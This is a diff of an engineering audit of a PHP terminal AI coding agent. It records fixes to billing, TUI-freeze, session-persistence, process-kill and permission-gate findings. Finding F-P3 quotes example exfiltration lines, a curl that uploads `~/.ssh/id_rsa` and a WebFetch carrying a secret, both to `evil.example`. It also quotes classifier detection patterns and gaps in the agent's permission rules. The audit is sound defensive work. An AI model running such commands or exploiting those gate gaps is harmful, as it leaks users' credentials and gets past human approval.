+| **A20** | Medium | reading | Bedrock tables match only bare ids: real versioned/profile ids get an 8k window and an invented $0.01/1k. Partly fixed (`c9772c065`: ids normalised, unknown → window 0 + unpriced, profile-id `DEFAULT_MODEL`); remaining: the factory's default config still sends the bare id, `modelPrices` plumbing (A15) | BedrockProvider.php; ProviderFactory.php:436 |
+| **A21** | Medium | suspected | Gemini 2.5 default thinking: thought tokens missing from Usage and sharing the 4096 `maxOutputTokens`. Partly fixed (`ade4d444a`: `thoughtsTokenCount` counted and priced); remaining: (b) default output budget and `thinkingBudget` (deferred decision) | VertexProvider.php:127 |
+| B4 | Medium (High paid) | reading | Task sub-agent spend never reaches the parent, session total or cap. Partly fixed (`badb3353e`: usage on `ToolResult`, folded per settled result, parent spend probe in the Task engine); remaining: parallel siblings blind to each other (overshoot ≤ one step), crashed tool child reports nothing, Chat's E17 `totalTokens` fallback inflated | TaskTool.php; ToolResult.php; Runtime.php; Chat.php:16240 |
 | A18 | (sharpens #27/#28) | suspected | Default SGLang `max_tokens` 4096 with effort `max` | SglangProvider.php:1030, 165 |
 | **A23** | Low-Med | reading | Replayed tool-call arguments send a nested empty map (`{"opts":{}}`) as `[]` (residual of A7) | ToolSchema.php:195-196 |
 | A11 | Low | reading | Malformed argument JSON runs the tool with `[]`; model not told | CustomProvider.php:628; SglangProvider.php:2221 |
-| A16 | Low | repro (shape) | Bedrock: no same-role merge, blank text blocks | BedrockProvider.php:316-332 |
-| B5 | Low | reading | Two withers drop the spend cap (latent) | EngineBackend.php:542, 575 |
 | **C3** | Low | reading | Project instructions and `@imports` have no byte budget (rules have 64 KiB) | Runtime.php:3009-3041; InstructionFileLoader.php:841-871 |
 | **C4** | Low (docs) | reading | Notice-sink clip/overflow strings and TROUBLESHOOTING.md still say "full text on stderr"; in the TUI it is in the log file (residual of C2) | RuntimeNoticeSink.php:202, 267; TROUBLESHOOTING.md:85-91, 135, 326 |
+| **A24** | Info (test comment) | reading | `UsageWiringTest` comment still calls Vertex's rate table "a placeholder 0.0" (stale since A15) | tests/Integration/UsageWiringTest.php:1012-1014 |
 
-New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → Verified-by-repro), A16 (Suspected → wire shape verified by repro), C1 (Low/Suspected → Info, not reachable). Sharpened: A13 (fix aligned with the `contextWindow()` contract). Items sharpened in that pass and since fixed are listed under **Fixed since audit**. Found while fixing A7 in wave 2: **A23**. Found while fixing C2 in wave 3: **C4**.
+New in the final pass: **A19, A20, A21, C2, C3**. Re-graded: B6 (Suspected → Verified-by-repro), A16 (Suspected → wire shape verified by repro), C1 (Low/Suspected → Info, not reachable). Sharpened: A13 (fix aligned with the `contextWindow()` contract). Items sharpened in that pass and since fixed are listed under **Fixed since audit**. Found while fixing A7 in wave 2: **A23**. Found while fixing C2 in wave 3: **C4**. Found while fixing A15 in wave 4: **A24**.
 
 ---
 
@@ -19827,6 +19810,9 @@ These findings were fixed on master after the audit. Their sections and table ro
 - **C1** `waitpid -1` never settled an exempt parallel job — fixed on master in `c10717d8c` (both wait sites go through `parallelJobHasExited()`, which treats any non-zero answer as gone; the payload file is still read, so the real result arrives).
 - **A17** `embeddings()` swallowed transport errors and returned an empty list — fixed on master in `106ea5253` (both providers throw `\RuntimeException` with the provider's own error text and the Guzzle exception as `previous`, so `TransientFailure` still classifies 5xx, 429 and connect failures as transient and 400 as permanent; a 2xx body that is not JSON, has no `data` list, or has an item without an `embedding` also throws; `data: []` still returns an empty result).
 - **C2** Engine-side `error_log()` diagnostics painted over the TUI frame — fixed on master in `9a827f4e3` + `520298b79` + `0c2bbd0a7` (new `Diagnostics\TuiErrorLog` points `error_log` at `~/.sugar-crush/logs/sugarcrush.log`, directory 0700 and file 0600, refusing a symlinked file, rotating one generation past 5 MiB and keeping an operator's own destination; `bin/sugarcrush` arms it on the TUI path just before `Program::run`; `RuntimeNoticeSink::warn()` skips `error_log()` while armed with a transport and the destination is still stderr) and `080fac09d` (the SGLang `</parameter>` truncation-risk warning is logged once per tool-call id per provider instance, an empty id keyed by a content hash, at most 1024 entries). Residual: if the log cannot be set up, the parsers' direct `error_log()` calls can still reach the tty; the notice-sink strings and TROUBLESHOOTING.md still say "full text on stderr" (C4).
+- **B5** `withPermissionApprover()` and `withMemoryStore()` silently dropped the spend cap — fixed on master in `d4ecedcea` (every `EngineBackend` wither goes through one private `mutate()`, so both withers keep `spendCapUsd` and `sessionSpendAtStartUsd`).
+- **A19** Vertex `ApiException` 429/503 were never classified transient, so they got no retry — fixed on master in `a26489378` (`TransientFailure::isTransient()` judges a Vertex `ApiException` by its gRPC status, so `RESOURCE_EXHAUSTED` (429) and `UNAVAILABLE` (503) retry and `UNAUTHENTICATED` (401) does not, falling back to the numeric code; the `VertexProvider` docblock that claimed this already worked is corrected).
+- **A16** Bedrock did not merge consecutive same-role turns and sent blank text blocks — fixed on master in `9c706ed39` (a new `conversationTurns()` step, used by both `converse` and `converseStream`, merges adjacent same-role turns and drops blank text blocks).
 
 
 ---
@@ -19889,13 +19875,6 @@ Confidence labels:
 - **Partly fixed on master in `2a3a8f91c`.** New `Message::$uiOnly` (with `withUiOnly()`, `Message::notice()` and `Message::agentVisible()`) round-trips through `jsonSerialize()`/`fromArray()` and survives every wither, checkpoint revival and the compaction rebuild, and is never put on the wire. Every command echo and output, `/help`, the queued, refusal and hook-blocked notices, launch, runtime and background notices, palette rows, status notices and backend error strings are flagged. The filter runs at Chat's turn dispatch, in the titler (which now counts agent-visible user turns), the suggester, `EngineBackend::toTypedMessages()` and `CommandBackend::encodeHistory()` (shared by `StreamingCommandBackend`); the token estimate skips UI-only rows. Left visible on purpose: `/websearch` results (known #22), hook `additionalContext`, the 70% reminder, and the permission-refusal note (the model's only record of the refusal). **Remaining:**
   - the compaction summary's input is not filtered, because filtering only one side breaks the exchange-key alignment;
   - notice order is unchanged: notices still render, interleaved, between a prompt and its answer in the transcript (they are off the wire).
-
-#### 15b-04 — A synchronous UserPromptSubmit / SessionStart hook chain runs inside `update()`
-- **Severity:** Medium · **Confidence:** Verified-by-reading
-- **Where:** `src/Chat.php:4587` (`$this->hooks->userPromptSubmit(...)`) is reached from `submit()` → `update()`. `HookRegistry::executeHooks()` → `ScriptHook` does a blocking `proc_open` plus `stream_select` drain. `ScriptHook::DEFAULT_TIMEOUT_SECONDS = 60.0` per hook.
-- **Failure scenario:** A slow or hung prompt hook freezes the whole TUI for up to 60 s per hook (times the chain): no repaint, no Ctrl+C, no Esc. `releaseQueuedPrompts()` runs the same path at settle time.
-- **Fix:** Run turn hooks in a `Cmd::promise` (child or async process). Dispatch the turn from the resolved message.
-- **Test:** A hook that sleeps 2 s. Assert that `update(Enter)` returns in under 100 ms with a pending Cmd.
 
 #### 15b-05 — Menu-bar and shell commands erase the user's draft, then mid-turn refuse with "Your draft is still in the box"
 - **Severity:** Medium · **Confidence:** Verified-by-repro (`r8_menu_draft.php`)
@@ -20006,6 +19985,13 @@ Confidence labels:
 - **Fix:** reword the two rationales to the transcript-clutter reason, and point the `DetectsCapabilities` docblock at `ToolResult::mosaic()` (and the boot-time warm-up).
 - **Test:** none needed beyond review.
 
+#### 15b-33 — A `/fork` docblock still names `SessionStore::forkSession()` as the transcript copy
+- **Severity:** Info (comment) · **Confidence:** Verified-by-reading (found during wave 4)
+- **Where:** `src/Chat.php:13269`, in the docblock of the `/fork` handler: "The transcript copy is {@see SessionStore::forkSession()}, the same call `/branch` makes".
+- **Detail:** since 15e SES-2's fix (`698a1efff`), the copy that carries the conversation is `EnhancedSessionStore::forkSession()`, which copies the transcript, checkpoints, blobs and meta in one transaction around `SessionStore::forkSession()`'s row copy. The `@see` points readers at the method that copies only the `sessions` row and the legacy tables.
+- **Fix:** re-point the `@see` at `EnhancedSessionStore::forkSession()`.
+- **Test:** none needed beyond review.
+
 ### E. Repository-supplied and model-supplied text in overlays and panes
 
 #### 15b-17 — Model or tool text containing U+E002+n paints a copy of on-screen image n at a position the text chooses, and blanks Nerd Font glyphs (lead 3)
@@ -20047,40 +20033,7 @@ Confidence labels:
 
 ### F. Custom commands, session commands and persistence
 
-#### 15b-20 — A custom command's `` !`…` `` runs synchronously inside `update()` for up to 10 s, and on timeout its grandchildren survive
-- **Severity:** Medium · **Confidence:** Verified-by-repro (`r14_cmd_shell.php`)
-- **Where:**
-  - `Chat::submit()` → `expandCustomCommand()` (`src/Chat.php:7202`) → `commandDirective()` → `CommandSpec::runShellSubstitution()` (`src/Chat.php:8116`).
-  - `runShellSubstitution()` (`src/Commands/CommandSpec.php:563-760`) runs a blocking `stream_select` loop against the shared 10-second `SHELL_BUDGET_SECONDS`.
-  - On timeout it calls `proc_terminate($process)` at `:679`. That signals only the direct child. `ProcessContainment::spawnSpec()` made that child a session leader through `setsid`, but no `kill(-pgid)` is sent, even though `ProcessContainment::groupId()` exists for exactly this.
-- **Repro:**
-  - A template `` !`bash -c 'exec -a <tag> sleep 38'; echo done` `` blocks `expandTemplate()` for **10.1 s**. During that time the TUI is frozen with no repaint, Esc or Ctrl+C, the same class of defect as 15b-04.
-  - After the "killed after 10 seconds" notice, the `<tag> sleep 38` grandchild is **still running**.
-  - Any `` !`…` `` that starts a background job holding stdout (`npm run dev &`, `docker compose up &`) costs the whole budget and leaks the job.
-- **Fix:**
-  - Expand file-based commands off the update path, in a `Cmd::promise` or child process that resolves to a "submit expanded text" message.
-  - Kill the process group on timeout: `posix_kill(-ProcessContainment::groupId($process), SIGTERM)`, then `SIGKILL`, through `ProcessReaper::escalate()` as `SystemClipboard` does.
-  - Register the site with `tools/check-child-lifetimes.php`, if it is not already accounted for there.
-- **Test:** The template above with a 1 s budget override. Assert `update(Enter)` returns in under 100 ms with a pending Cmd. After the budget expires, assert `pgrep -f <tag>` finds nothing.
-
-#### 15b-21 — `/branch` (and any first save of a long history under a new session id) freezes the TUI for seconds: one autocommitted INSERT per message (lead 4)
-- **Severity:** Medium · **Confidence:** Verified-by-repro (`r12_persist_cost.php`)
-- **Where:**
-  - `Chat::update()` → `persistTranscript()` (`src/Chat.php:1512`) → `EnhancedSessionStore::saveTranscript()` → `encodeCheckpoint()` → `internMessages()`.
-  - `internMessages()` executes `INSERT OR IGNORE INTO checkpoint_blobs` once per missing message (`src/Session/EnhancedSessionStore.php:709-719`) with **no surrounding transaction**. Each insert is its own WAL commit, with an fsync at the default `synchronous=FULL`.
-  - Blobs are keyed by `session_id`. `/branch` (`handleBranchCommand()`, `:12054`) moves `currentSessionId` to the fork, so the next save re-interns **every** message under the new id. `SessionStore::forkSession()` copies the `messages` rows but not `checkpoint_blobs`.
-- **Measured** (800 messages, 2.4 MB, local SSD):
-  - first save: **5.5 s**
-  - save under the new branch id: **4.3 s** (823 messages)
-  - steady-state save of one new row: 16 ms median, 35 ms max
-  - cold-cache save after a restart: 51 ms
-  - The branch figure is paid synchronously inside the `update()` that handles `/branch`.
-- The steady-state 16-35 ms is also paid on **every** history change in `update()`, including each `ToolStarted`, `ToolFinished` and runtime notice. It is tolerable on an SSD and noticeable on network or slow disks.
-- **Fix:**
-  - Wrap `internMessages()` and the transcript write in one `beginTransaction()` / `commit()`. That is one fsync per save, not one per message.
-  - In `forkSession()`, copy the source session's blobs with `INSERT … SELECT`.
-  - Longer term, move persistence off `update()` (a debounced `Cmd`).
-- **Test:** Spy on the PDO (or count `PRAGMA data_version` bumps) across `saveTranscript()` of 50 new messages and assert one commit. A `/branch` performance guard: 800 messages under 300 ms.
+Both findings here (15b-20, 15b-21) were fixed in wave 4; see **Fixed since audit**.
 
 ---
 
@@ -20089,11 +20042,8 @@ Confidence labels:
 | ID | Sev | Conf | Title |
 |---|---|---|---|
 | 15b-03 | Med-High | Repro | Command output, mid-turn notices and background/runtime notices go to the model as real turns. Partly fixed (`2a3a8f91c`: `Message::$uiOnly`, filtered at every wire encoder); remaining: compaction input unfiltered, notices still interleave between a prompt and its answer |
-| 15b-04 | Medium | Reading | UserPromptSubmit/SessionStart hooks run synchronously inside update() (up to 60 s freeze) |
 | 15b-05 | Medium | Repro | Menu and shell commands erase the draft, then claim "draft still in the box" |
 | 15b-09 | Medium/Low | Repro | Status bar not clipped to cols; content width (and every overlay) floored at 20+chrome |
-| 15b-20 | Medium | Repro | Custom-command `` !`…` `` blocks update() up to 10 s; timed-out grandchildren survive |
-| 15b-21 | Medium | Repro | `/branch` re-interns every message with one autocommitted INSERT each: 4.3 s freeze at 800 messages |
 | 15b-26 | Medium | Repro | candy-core `Width::wrap()` loops forever when a 2-cell cluster meets a 1-column budget (latent in sugar-crush; reachable via candy-shell pager, sugar-table) |
 | 15b-13 | Low-Med | Reading | Token proxy chars/4 underestimates CJK 3-6×. Partly fixed (`8341a37c1`: script-weighted `TokenEstimate` for Chat's estimate, 85/95% tiers, status bar); remaining: `ContextCompactor` still chars/4 (70% reminder late for CJK), stale comments |
 | 15b-17 | Low-Med | Repro | U+E002+n in model or tool text paints a copy of on-screen image n where the text chooses; Nerd Font glyphs blanked |
@@ -20108,6 +20058,7 @@ Confidence labels:
 | 15b-30 | Low | Repro | candy-shine `stream()` ≠ `render()` when the text has link reference definitions (sugar-crush renders such partials whole) |
 | 15b-31 | Low | Repro | candy-shine `SectionScanner::finish()` drops the closed section before a trailing heading; no boundary after a closing fence (residual of 15b-10) |
 | 15b-32 | Info | Reading | Stale comments: launch notices "re-sent every turn" (Bootstrap, SessionStore); DetectsCapabilities cites Doctor's removed `??=` probe |
+| 15b-33 | Info | Reading | `/fork` docblock (`Chat.php:13269`) still names `SessionStore::forkSession()` as the transcript copy (stale since SES-2) |
 
 **Checked and dropped:**
 - **Documented and intentional:** `/HELP`, `/clear all`, `/exit now` and unknown `/foo` fall through to the model (`docs/COMMANDS.md` "Two guards…"). The held queue after Esc Esc goes out after the next prompt (`InFlightInputQueueTest::testAQueueHeldThroughACancelGoesOutOnTheNextSettle`).
@@ -20199,6 +20150,9 @@ These findings were fixed on master after the audit. Their sections and table ro
 - **15b-23** Positional `$N` splitting: an apostrophe swallowed the rest of the line and `""` shifted the arguments — fixed on master in `0147c5f7a` + `1173b2ada` (a quote opens a span only at a token start, an unterminated quote stays literal, and an empty quoted span yields an empty token). Residual: `/model ""` now answers "Could not switch to provider ''" instead of opening the palette, because the user typed an explicit empty name.
 - **15b-10** Every frame re-rendered the whole history through CandyShine — fixed on master in `05f86a2a9` (exact memos in `src/Renderer.php`: settled CandyShine bodies in an LRU per width and content hash, scoped to one theme object; incremental streaming through CandyShine's `SectionScanner`, re-rendering only the open tail; per-row SGR transitions in `balanceSgr()`; the line count of collapsed tool bodies; the tool-zone dedup is a keyed lookup and labels are styled once per frame; 529 frames of a differential corpus are byte-identical to the old Renderer). At 120×40: 50/200/800 exchanges 182/698/2949 → 15/52/211 ms per frame, 300 warm markdown exchanges 965 → 38 ms (target was under 50), a 200K streaming partial 2197 → 81 ms. Residual: `r13_stream_cost.php` as written (headings straight after a closing fence) is only partly faster, 207/2526 → 112/1120 ms at 20K/200K, because `SectionScanner` finds no boundary there (15b-31); the memo works around two candy-shine bugs (15b-30, 15b-31).
 - **15b-12** Session titling fell back to the main, tool-armed backend — fixed on master in `37ff6d54f` (titling is skipped when `titleBackend` is null, the same gate prompt suggestions use; no other `?? backend` fallback exists).
+- **15b-04** UserPromptSubmit and SessionStart hook chains ran synchronously inside `update()` — fixed on master in `f1b6862e9` (script turn hooks run off `update()` in a forked child, and the turn is dispatched from the resolved `TurnHooksResolvedMsg`).
+- **15b-20** A custom command's `` !`…` `` ran synchronously inside `update()` for up to 10 s, and on timeout its grandchildren survived — fixed on master in `2826f5cf3` (the expansion runs off `update()` through a forked child, `forkedPayloadCmd()`, and resolves to `CustomCommandExpandedMsg`; on timeout `ProcessContainment::killTree()` plus a SIGKILL to the process group also catch `&` background jobs; gate checks made in the child are replayed into the session gate).
+- **15b-21** `/branch` and any first save of a long history froze the TUI for seconds, one autocommitted INSERT per message — fixed on master in `698a1efff` (with 15e SES-2: save, checkpoint and restore each run in one `BEGIN IMMEDIATE` transaction, and a fork copies the blobs, so the first save on a `/branch` re-interns nothing). Measured at 800 messages: first save 6519 → 233 ms, first save on a branch 5996 → 17 ms; the fork itself takes about 470 ms (the fsync of the copied blobs). Residual: persistence still runs synchronously from `Chat::update()` (`persistTranscript()`); moving it to a debounced `Cmd` is not done.
 
 
 ---
@@ -20217,7 +20171,7 @@ Repro scripts: `/home/sites/crush-research-repos/_audit-scratch/15c/rNN_*.php`. 
 
 Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Fifteen have since been fixed on master (see **Fixed since audit** at the end), so 16 remain: 1 Med-High (F-E2, partly fixed), 7 Medium, 1 Low-Medium, 7 Low. One more was found during wave 2 (F-E4, Info) and one during wave 3 (F-E5, Low), so 18 are open.
 
-> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, and since `c8fc573a5` it describes the fail-closed allow rules that closed F-P5. The real defects in the new matcher were narrower. F-P5 (`$(…)`, backticks and redirection slipping past an allow rule) is now fixed. F-J3 covers path rules missing respellings and is still open.
+> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, and since `c8fc573a5` it describes the fail-closed allow rules that closed F-P5. The real defects in the new matcher were narrower. F-P5 (`$(…)`, backticks and redirection slipping past an allow rule) is now fixed. F-J3 covers path rules missing respellings; it is partly fixed (`3b7d2fd33`, the live hook chain), and the callers that pass no root are still open.
 
 **Relation to the known list (99-synthesis Part II).** Nothing below repeats a known item. Where a finding touches one, the overlap is stated.
 
@@ -20264,6 +20218,7 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Failure:** With rule `Read(/proj/secret.txt)` deny, the call `/proj/secret.txt` → Deny, but **`secret.txt` → Allow** and **`./secret.txt` → Allow**. The tools resolve relative paths against `--root`, so all three name the same file. A symlink `notes -> secret.txt` also passes any path deny rule, because realpath is never consulted.
 - **Fix:** Before matching, resolve the subject the way the tool will, with `PathJail::resolve($root, $subject)` (the gate needs the root). Match deny rules against both the raw spelling and the resolved spelling, which mirrors what `ProtectFilesHook::pathSpellings()` already does.
 - **Test:** A deny rule with an absolute pattern, then calls with a relative, `./`, `sub/../`, and symlink spelling. All must Deny.
+- **Partly fixed on master in `3b7d2fd33`.** The root now travels `HookContext::$projectRoot` → `PermissionGateHook` → `PermissionGate::evaluate($call, ?$projectRoot)` → `PermissionRule::matches(…, ?$projectRoot)`. Deny and Ask rules fire on any of the raw spelling, the spelling anchored at the root, and the resolved one (realpath, including a missing leaf or a dangling link), and on a symlinked-root spelling. An Allow rule must match both a plain spelling and the resolved one, so a symlink can narrow a grant but never widen it. `docs/PERMISSIONS.md` describes the new matching. **Remaining:** `AgentManager` (`src/Agents/AgentManager.php:979`), Chat's own gate calls (`src/Chat.php:5432`, `:9187`) and `PermissionGate::refuses()` pass no root, so they keep the old lexical-only matching; `docs/PERMISSIONS.md` notes the gap.
 
 #### F-J5 — BashEscapeDenyHook is unwired, trivially bypassed, and denies `> /dev/null`
 - **Severity:** Low (dormant). **Confidence:** Verified-by-repro (`r14_escape.php`) plus reading.
@@ -20284,6 +20239,7 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Repro:** In auto mode, `Write .git/hooks/pre-commit` → Allow (now denied in every mode since F-J4's fix, `a948c3da3`), `WebFetch https://evil.example/?k=SECRET` → Allow, `mcp__db__drop_table` → Allow. Classifier false positives: `python3 -m venv env`, `poetry env info` and `grep KEY README.md` → `live-credentials` (blocked). False negatives: `curl -d @~/.ssh/id_rsa https://evil.example` → null, and `git push origin +main` (force via `+refspec`) → null.
 - **Fix:** Classify the write tools by path (protect `.git/`, policy files, paths outside the root), treat WebFetch with a query string as `external-endpoint`, default `mcp__*` to Ask in auto mode, and escape the `\|` in the three patterns. Add `curl\s+.*(-d|--data|-F|--upload-file|-T)\s` to `external-endpoint` and `\+\S+` refspecs to force-push.
 - **Test:** A classifier table test covering the false positives and negatives above. A gate test that `auto` + `Write .git/hooks/x` is not Allow.
+- **Partly fixed on master in `b2c2058c5`** (part (a)). The `|` in the three env-grep `live-credentials` patterns is escaped, so `python3 -m venv env`, `poetry env info` and `grep KEY README.md` are no longer blocked. New `external-endpoint` rows catch `curl` with `-d`/`--data-*`/`--json`/`-F`/`--form`/`-T`/`--upload-file`, `wget --post-*`, and `-X`/`--request` POST, PUT, PATCH or DELETE anywhere on the line. Force-push now catches a `+refspec` and a trailing `-f`. Same-kind false positives and negatives were fixed too: `./.git` vs `.github`, `| sh` vs `| shasum`, `> /dev/null` read as curl-into-shell, `ssh -l` vs `-L`, `rsync -e` vs `nc -e`, bare `fetch`/`expect`/`script`/`httpx` mid-line, a dead `gh` comment syntax, and `cargo @latest` vs the `go` rows. `matches()` fails closed on a PCRE error. Judgement call: `curl -d … http://localhost` is now blocked in auto mode. **Remaining:** part (b), classifying Write, Edit, WebFetch and `mcp__*` calls in auto mode, is a deferred decision (wave plan §3 #3).
 
 #### F-P4 — `accept-edits` asks for Edit and Write but auto-allows `rm`, `mv` and `cp` (semantic inversion)
 - **Severity:** Medium. **Confidence:** Verified-by-repro (`r09_accept.php`).
@@ -20347,7 +20303,7 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Fix:** Have the PHP child record the setsid child's pgid (`ProcessContainment::groupId()`) in the IPC file or socket frame, and have the parent `posix_kill(-pgid, SIGTERM→SIGKILL)` alongside the pid kill. Alternatively, the child installs a SIGTERM handler that terminates its group, and the parent sends SIGTERM first. `prctl(PR_SET_PDEATHSIG)` is not available from PHP.
 - **Sub-agent cascade (lead 6, confirmed by reading):** A Task call is `ParallelSafe` and `ExemptFromParallelDeadline`, so it runs in its own fork under the turn fork, and the deadline sweep skips it (`Runtime.php` phase 3: `|| $job['tool'] instanceof ExemptFromParallelDeadline) continue;`). When the turn fork is killed, the Task fork is reparented. Its only check is `ParentProcessGuard` (`TaskTool.php`, `$orphanGuard` in `onProgress`), and that fires only on the sub-agent's **next** ToolStarted, ToolFinished or reasoning delta. Until then, the sub-agent's in-flight provider request continues. In-flight Bash calls continue as in the repro above. Any parallel group the sub-agent had already forked keeps running too, because `executeConcurrently()`'s `finally` "DELIBERATELY DOES NOT … KILL" an abandoned child. `Write.php:30-39` gives "a cancelled turn could still leave a file on disk the user never approved" as the reason Write must never be ParallelSafe. A parallel Task, which runs Write, Edit and Bash, re-opens exactly that hole one level down.
 - **Test:** The repro as a PHPUnit test with the kill pattern from MEMORY (backgrounded pkill watchdog). Assert the marker file does **not** appear within 4 s after the parent kill. Add a sibling test where the Bash runs inside a Task sub-agent.
-- **Partly fixed on master in `c54372b2a`** (with 15a B2). New `ProcessContainment::killTree()` freezes the root, walks `/proc` stopping every descendant, then SIGKILLs every member's process group and pid. It is wired into `EngineBackend`'s cancel and idle teardown and into `Runtime`'s parallel-deadline kill, so the setsid'd `bash` dies with the turn, and so does the cascade to parallel Task sub-agents and their own Bash groups and forks. **Remaining:** the dormant `Chat.php` kill site (about `:4783`) is deferred to w7-gate-prov; the `AgentWorkerPool` and `EngineExecutor` fork kill sites still send a single `posix_kill` to the pid, not `killTree()`. Also, `killTree()` blocks the event loop for about 110 ms on Escape.
+- **Partly fixed on master in `c54372b2a`** (with 15a B2). New `ProcessContainment::killTree()` freezes the root, walks `/proc` stopping every descendant, then SIGKILLs every member's process group and pid. It is wired into `EngineBackend`'s cancel and idle teardown and into `Runtime`'s parallel-deadline kill, so the setsid'd `bash` dies with the turn, and so does the cascade to parallel Task sub-agents and their own Bash groups and forks. **Remaining:** the dormant `Chat.php` kill site (about `:4783`) is deferred to w7-gate-prov; the `AgentWorkerPool` and `EngineExecutor` fork kill sites still send a single `posix_kill` to the pid, not `killTree()` (since `4fa805970`, 15e WF-1 (a), the pool's new per-agent deadline kill does use `killTree()`; its cancel path, `terminateWorker()`, does not). Also, `killTree()` blocks the event loop for about 110 ms on Escape.
 
 #### F-E4 — `ParallelSafe`'s docblock still describes two orphan hazards that B2 and B3 fixed
 - **Severity:** Info (doc) · **Confidence:** Verified-by-reading (found during wave 2)
@@ -20398,8 +20354,8 @@ All four findings here (F-H1 to F-H4) were fixed in wave 3; see **Fixed since au
 | F-E2 | Med-High | Repro | Cancel or deadline SIGKILLs the PHP child only; setsid'd bash keeps running; Task sub-agents cascade. Partly fixed (`c54372b2a`: tree kill at turn teardown and parallel deadline); remaining: dormant Chat site, `AgentWorkerPool` and `EngineExecutor` kill sites |
 | F-T2 | Medium | Repro | Edit ignores `$maxBytes`; 35 MB file → 650 MB peak |
 | F-T3 | Medium | Reading | WebFetch 2 MiB raw result (32× Bash cap) |
-| F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks |
-| F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs |
+| F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks. Partly fixed (`3b7d2fd33`: the live hook chain passes the root; deny/ask match raw, root-anchored, resolved and symlinked-root spellings, allow must match plain and resolved); remaining: `AgentManager`, Chat and `refuses()` pass no root (lexical only) |
+| F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs. Partly fixed (`b2c2058c5`: regexes escaped, upload/POST and `+refspec` rows, same-kind FP/FN fixes, fail closed on PCRE error); remaining: (b) classify Write/Edit/WebFetch/`mcp__*` (deferred decision) |
 | F-P4 | Medium | Repro | accept-edits: Edit/Write Ask but `rm`/`mv`/`cp` Allow |
 | F-P6 | Medium | Reading | WebFetch "read-only" → unprompted exfiltration in default/plan/dont-ask |
 | F-E1 | Medium | Repro | Bash and hooks inherit provider API keys; HOOKS.md env table wrong |
@@ -20854,20 +20810,6 @@ Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (ea
 
 ### B. Sessions and persistence
 
-#### SES-2 — `forkSession()` copies only the legacy `messages`/`tool_calls` tables, which nothing writes. The fork has no transcript, no checkpoints, no meta, and inherits the parent's **name**.
-- **Severity:** Medium. It is part of the root cause of the known "/fork ignores history" item (#30), plus new consequences.
-- **Confidence:** Verified-by-repro
-- **Where:** `src/Session/SessionStore.php:210-279`, `src/Session/EnhancedSessionStore.php:74-77`; callers `src/Chat.php:12041` (`/branch`) and `:12125` (`/fork`)
-- **Repro output:** parent transcript rows: 2 → `fork transcript: NULL`, `fork checkpoints: 0`, `fork name: my-work`, `messages table rows total: 0`. A grep shows `SessionStore::addMessage` has no caller outside the store.
-- **Impact:**
-  1. `/fork` hands its background daemon an id whose stored conversation is empty, so even a fixed daemon could not load history.
-  2. `/branch` survives only because `persistTranscript()` re-saves the in-memory history under the new id. `/rewind` on the branch has no checkpoints, so it reports "No checkpoints available".
-  3. Branch and parent share a name. `getSessionByName()` (`SessionStore.php:190-195`, no `ORDER BY`) then resolves `sugarcrush --resume my-work` to an arbitrary row (in practice the **parent**), not the branch the user is working in.
-  4. Named sessions are exempt from `pruneSessions()`, so every branch of a named session lives forever.
-- **Fix:** in `EnhancedSessionStore::forkSession()`, copy `session_transcripts`, `checkpoints`, `checkpoint_blobs` (re-keyed to the new session), and `session_meta` in one transaction. Give the fork `"<name> (branch)"` or NULL. Make `getSessionByName()` deterministic (`ORDER BY updated_at DESC`) or enforce unique names.
-- **Test:** save transcript and checkpoint, fork, then assert `loadTranscript(fork)` equals the parent's, checkpoints are copied, and the name differs.
-- **Repro:** `fork.php`
-
 #### SES-3 — No single-writer guard per session: two TUIs on one session (`--continue` twice, or `--resume X` in two terminals) silently clobber each other's transcript and interleave checkpoints
 - **Severity:** Medium
 - **Confidence:** Verified-by-reading
@@ -20876,27 +20818,7 @@ Repro scripts live in `/home/sites/crush-research-repos/_audit-scratch/15e/` (ea
 - **Also (former lead 4, Verified-by-reading; no two-process repro was run):** blobs are per session (`UNIQUE(session_id, hash)`, `:184-193`), so the interning race needs this same two-writers setup. `internMessages()` (`:676-742`) checks `PRAGMA data_version` once (`forgetInternedBlobsIfStale()`) and then trusts its in-memory `hash → id` cache. If the other TUI runs `/rewind` in between, its `collectCheckpointBlobs()` (`:1075-1113`) deletes those ids. The checkpoint or transcript then stores ids whose blob rows are gone, so later loads return the conversation with those messages missing. The per-session lock in the fix below closes this too.
 - **Fix:** take an advisory lock per session (a `flock` on `<configDir>/sessions/<id>.lock`, or a `sessions.owner_pid` and `owner_start` column checked at open). When the session is held, refuse, or fork automatically. Add `UNIQUE(session_id,"index")` and wrap index allocation and insert in `BEGIN IMMEDIATE`.
 - **Test:** two `EnhancedSessionStore` instances on one DB saving interleaved transcripts; assert a conflict is detected rather than lost. Add a unique-index test for checkpoints.
-
-#### SES-4 — Checkpoint blobs are garbage-collected only on `/rewind`, so pruned checkpoints and compacted history leave orphan blobs forever
-- **Severity:** Low
-- **Confidence:** Verified-by-repro
